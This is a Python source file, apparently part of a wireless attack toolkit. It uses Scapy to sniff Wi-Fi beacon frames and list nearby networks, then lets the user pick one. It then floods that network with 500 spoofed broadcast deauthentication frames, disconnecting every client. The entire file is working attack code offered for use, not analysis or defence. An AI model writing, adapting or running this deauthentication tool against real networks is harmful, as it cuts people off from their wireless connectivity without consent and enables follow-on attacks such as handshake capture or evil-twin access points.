from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
from scapy.sendrecv import sniff
from scapy.all import *
import os
from validators import wd_arg_validator
from common import helper

def get_wifi_networks(interface):
    networks = []
    scan_result = []

    try:
        scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
    except KeyboardInterrupt:
        pass

    for packet in scan_result:
        if packet.haslayer(Dot11Beacon):
            essid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr3
            if essid not in [net[0] for net in networks]:
                networks.append((essid, bssid))
                
    return networks    
    
def deauth_all_devices(target_bssid, iface):
    deauth_packet = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()

    sendp(deauth_packet, iface=iface, count=500, inter=0.1)

def run(args):

    if '-h' in args:
        helper.wd_helper()

    interface = wd_arg_validator.validate(args).interface

    print('---------------------------------------------')
    print('---------------- Scanning... ----------------')
    print('---------------------------------------------')

    try:
        wifi_networks = get_wifi_networks(interface)
    except OSError:
        print('Invalid interface passed...')
        return

    print('---------------------------------------------')
    print('------------- Scanner Complete --------------')
    print('---------------------------------------------') 
    print('')

    if wifi_networks:
        os.system('clear')
        print('Wifi networks found:')
        for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
            print(f'{idx} - ESSID: {essid}, BSSID: {bssid}')
        
        selected_option = int(input('Select the network ID to deauth: '))
        if 1 <= selected_option <= len(wifi_networks):
            selected_bssid = wifi_networks[selected_option - 1][1]
            print(f'Deauthing: {selected_bssid}')
            deauth_all_devices(selected_bssid, iface=interface)
        else:
            print('Invalid id')  
    else:
        print('Wifi networks not found!')
        return
    

    print('---------------------------------------------')
    print('------------- Deauth Complete ---------------')
    print('---------------------------------------------')
    print('')
    print('Deauth sent to all network devices')

